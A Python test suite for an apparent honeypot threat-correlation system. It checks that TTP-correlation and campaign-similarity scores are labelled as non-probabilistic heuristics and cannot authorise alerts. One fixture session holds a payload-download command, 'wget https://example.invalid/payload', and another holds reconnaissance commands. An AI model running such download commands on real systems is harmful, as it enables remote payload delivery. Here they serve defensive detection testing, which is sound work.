"""Phase 4D COR-02/CAM-02 representation and claim-boundary tests."""

from __future__ import annotations

import copy
import json
from pathlib import Path

from production.api.dashboard_api import _current_prediction_payload
from production.api.monitor_web import _render_campaign_panel, _render_session_ttp_correlations
from production.api.security import api_row_view, session_detail_view
from production.correlation.campaign_clustering import (
    create_or_update_campaign,
    score_campaign_match,
)
from production.correlation.semantics import (
    CORRELATION_CONFIDENCE_SEMANTICS,
    LEGACY_CORRELATION_CONFIDENCE_SEMANTICS,
)
from production.correlation.session_ttp_correlation import (
    correlate_session,
    correlation_allows_influence,
    load_policy,
    validate_policy_document,
)
from production.policies.alert_authority_policy import load_alert_authority_policy
from production.storage import open_storage


POLICY_PATH = Path("configs/session_ttp_correlation.trusted.json")
ALERT_POLICY_PATH = Path("configs/alert_authority_policy.v1.json")


def _current_policy() -> dict:
    return load_policy(POLICY_PATH)


def _transfer_session() -> dict:
    return {
        "session_id": "phase4d-transfer",
        "commands": ["wget https://example.invalid/payload"],
        "classification_events": [],
        "raw_events": [],
    }


def test_current_policy_declares_exact_non_probability_semantics() -> None:
    policy = _current_policy()
    assert policy["policy"]["confidence_semantics"] == CORRELATION_CONFIDENCE_SEMANTICS
    assert validate_policy_document(policy, require_current_semantics=True) == []


def test_current_serialized_correlation_propagates_semantics_without_calibration() -> None:
    result = correlate_session(_transfer_session(), _current_policy())
    correlation = next(
        item for item in result["correlations"] if item["rule_id"] == "downloader-command-observed-correlates-t1105"
    )
    assert result["confidence_semantics"] == CORRELATION_CONFIDENCE_SEMANTICS
    assert result["summary"]["confidence_semantics"] == CORRELATION_CONFIDENCE_SEMANTICS
    assert correlation["confidence"] == 0.7
    assert correlation["confidence_semantics"] == CORRELATION_CONFIDENCE_SEMANTICS
    encoded = json.dumps(result, sort_keys=True)
    for forbidden in (
        '"probability":',
        '"calibrated_probability":',
        '"likelihood":',
        '"posterior":',
        '"predicted_probability":',
    ):
        assert forbidden not in encoded


def test_missing_semantics_is_explicit_legacy_and_strict_current_check_fails() -> None:
    policy = copy.deepcopy(_current_policy())
    policy["policy"].pop("confidence_semantics")
    assert validate_policy_document(policy, require_current_semantics=True)
    result = correlate_session(_transfer_session(), policy)
    assert result["confidence_semantics"] == LEGACY_CORRELATION_CONFIDENCE_SEMANTICS
    assert result["correlations"][0]["confidence"] == 0.7
    assert result["correlations"][0]["confidence_semantics"] == LEGACY_CORRELATION_CONFIDENCE_SEMANTICS


def test_malformed_semantics_cannot_authorize_stronger_consumers() -> None:
    policy = copy.deepcopy(_current_policy())
    policy["policy"]["confidence_semantics"] = "calibrated_probability"
    rule = policy["policy"]["rules"][1]
    rule["apply_to_campaign"] = True
    rule["provenance"]["reviewed"] = True
    assert validate_policy_document(policy, require_current_semantics=True)
    result = correlate_session(_transfer_session(), policy)
    correlation = result["correlations"][0]
    assert correlation["confidence"] == 0.7
    assert correlation["confidence_semantics"] == "calibrated_probability"
    assert correlation_allows_influence(correlation, "report") is True
    assert correlation_allows_influence(correlation, "campaign") is False
    assert correlation_allows_influence(correlation, "threat_hunt") is False
    assert correlation_allows_influence(correlation, "alert") is False


def test_campaign_scores_and_signals_are_heuristic_similarity_context(tmp_path: Path) -> None:
    storage = open_storage(f"sqlite:///{tmp_path / 'phase4d-campaign.db'}")
    policy = {
        "enabled": True,
        "min_commands_active": 1,
        "min_match_score": 0.20,
        "min_match_raw_score": 0.20,
        "min_independent_evidence_classes": 1,
        "emit_observational_signals": True,
    }
    first = {
        "session_id": "phase4d-similar-one",
        "commands": ["uname -a", "id"],
        "start_time": "2026-07-30T00:00:00Z",
        "updated_at": "2026-07-30T00:01:00Z",
    }
    second = {**first, "session_id": "phase4d-similar-two"}
    alert_policy = load_alert_authority_policy(ALERT_POLICY_PATH)
    created = create_or_update_campaign(storage, first, policy, alert_authority_policy=alert_policy)
    matched = create_or_update_campaign(storage, second, policy, alert_authority_policy=alert_policy)
    assert created["status"] == "created"
    assert matched["status"] == "matched"
    assert matched["confidence_semantics"] == CORRELATION_CONFIDENCE_SEMANTICS
    signal = matched["correlation_signal"]
    assert signal["signal_type"] == "similar_session_pattern_observed"
    assert signal["confidence_semantics"] == CORRELATION_CONFIDENCE_SEMANTICS
    assert signal["authority"] == {
        "semantics": "observation_only_non_authoritative",
        "may_claim_actor_identity": False,
        "may_create_alert": False,
        "may_authorize_response": False,
    }
    assert matched["matches"][0]["confidence_semantics"] == CORRELATION_CONFIDENCE_SEMANTICS


def test_campaign_weight_threshold_and_membership_contract_remains_frozen() -> None:
    campaign = {"campaign_id": "phase4d-existing", "source_ip": "192.0.2.40"}
    fingerprint = {
        "src_ip": "192.0.2.40",
        "hassh_fingerprint": "",
        "ja3_fingerprint": "",
        "command_pattern_hash": "",
        "tactic_sequence_hash": "",
        "primary_fingerprint_type": "src_ip",
        "primary_fingerprint_value": "192.0.2.40",
    }
    policy = {
        "field_weights": {"source_ip": 0.2},
        "min_match_score": 0.1,
        "min_match_raw_score": 0.1,
        "min_independent_evidence_classes": 1,
        "allow_source_ip_only_match": False,
        "source_ip_only_confidence": 0.2,
        "max_matches": 10,
    }
    score = score_campaign_match(campaign, fingerprint, policy)
    assert score["raw_score"] == 0.2
    assert score["score"] == 0.2
    assert score["confidence_semantics"] == CORRELATION_CONFIDENCE_SEMANTICS
    assert score["source_ip_only"] is True
    assert score["match_category"] == "source_ip_only_low_confidence"


def test_api_and_monitor_use_bounded_similarity_score_wording() -> None:
    api = api_row_view(
        "campaign_sessions",
        {
            "campaign_id": "legacy-campaign-id",
            "session_id": "phase4d-api",
            "confidence": 0.35,
            "payload_json": json.dumps({"match_reasons": ["matched hassh"]}),
        },
    )
    assert api["confidence"] == 0.35
    assert api["confidence_semantics"] == LEGACY_CORRELATION_CONFIDENCE_SEMANTICS
    campaign_html = _render_campaign_panel(
        {
            "ok": True,
            "session_payload": {"campaign_summary": {"status": "matched"}},
            "campaign_memberships": [
                {
                    "created_at": "2026-08-27T00:00:00Z",
                    "campaign_id": "legacy-campaign-id",
                    "confidence": 0.35,
                    "match_reasons": ["matched hassh"],
                }
            ],
            "campaigns": [],
        }
    )
    assert "observational similarity cluster" in campaign_html
    assert "heuristic strength (not probability)" in campaign_html
    correlation_html = _render_session_ttp_correlations(
        {
            "payload": {
                "session_ttp_correlations": [
                    {
                        "rule_id": "phase4d-rule",
                        "ttp": "T1105",
                        "confidence": 0.88,
                        "confidence_semantics": CORRELATION_CONFIDENCE_SEMANTICS,
                        "evidence_type": "session_correlated_candidate",
                    }
                ],
                "session_ttp_correlation_summary": {
                    "correlation_count": 1,
                    "confidence_semantics": CORRELATION_CONFIDENCE_SEMANTICS,
                },
            }
        }
    )
    assert "heuristic strength (not probability)" in correlation_html
    assert "calibrated probability" not in correlation_html.lower()
    prediction_api = _current_prediction_payload(
        {
            "payload": {
                "features": {
                    "session_ttp_correlations": [{"confidence": 0.70}],
                    "session_ttp_correlation_summary": {},
                }
            }
        },
        [],
    )
    assert prediction_api["session_ttp_correlations"][0]["confidence_semantics"] == LEGACY_CORRELATION_CONFIDENCE_SEMANTICS
    assert prediction_api["session_ttp_correlation_summary"]["confidence_semantics"] == LEGACY_CORRELATION_CONFIDENCE_SEMANTICS
    detail_api = session_detail_view(
        {
            "ok": True,
            "session_id": "phase4d-api",
            "session_payload": {"session_id": "phase4d-api"},
            "session_ttp_correlations": [{"confidence": 0.70}],
            "session_ttp_correlation_summary": {},
        }
    )
    assert detail_api["session_ttp_correlations"][0]["confidence_semantics"] == LEGACY_CORRELATION_CONFIDENCE_SEMANTICS
    assert detail_api["session_ttp_correlation_summary"]["confidence_semantics"] == LEGACY_CORRELATION_CONFIDENCE_SEMANTICS
